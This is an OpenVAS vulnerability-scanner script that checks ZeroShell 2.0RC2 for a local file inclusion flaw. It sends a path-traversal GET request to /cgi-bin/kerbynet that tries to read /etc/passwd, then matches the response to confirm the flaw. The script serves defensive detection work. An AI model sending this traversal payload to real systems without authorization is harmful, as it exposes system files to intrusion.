###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zeroshell_lfi_08_13.nasl 6074 2017-05-05 09:03:14Z teissa $
#
# ZeroShell 2.0RC2 File Disclosure / Command Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103761");
 script_version ("$Revision: 6074 $");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_name("ZeroShell 2.0RC2 File Disclosure / Command Execution");

 script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122799/ZeroShell-2.0RC2-File-Disclosure-Command-Execution.html");
 script_tag(name:"last_modification", value:"$Date: 2017-05-05 11:03:14 +0200 (Fri, 05 May 2017) $");
 script_tag(name:"creation_date", value:"2013-08-14 10:33:56 +0200 (Wed, 14 Aug 2013)");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 443);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "impact" , value : "An attacker can exploit this vulnerability to view files or execute
 arbitrary script code in the context of the web server process. This may aid in
 further attacks.
 Impact Level: Application");
 script_tag(name : "vuldetect" , value : "Send a GET request which tries to include /etc/passwd and check the response.");
 script_tag(name : "insight" , value : "Input to the 'Object' value in /cgi-bin/kerbynet is not properly sanitized");
 script_tag(name : "solution" , value : "Updates are available.");
 script_tag(name : "summary" , value : "ZeroShell is prone to a local file-include vulnerability because it
 fails to sufficiently sanitize user-supplied input.");
 script_tag(name : "affected" , value : "ZeroShell version 2.0RC2 is vulnerable; other versions may also
 be affected.");

 script_tag(name:"qod_type", value:"remote_app");
 script_tag(name:"solution_type", value:"VendorFix");

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:443);

buf = http_get_cache(item:"/", port:port);

if("<title>ZeroShell" >!< buf || "kerbyne" >!< buf)exit(0);

url = '/cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../etc/passwd';
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req);

if(buf =~ "root:.*:0:[01]") {

  security_message(port:port);
  exit(0);
}  

exit(99);
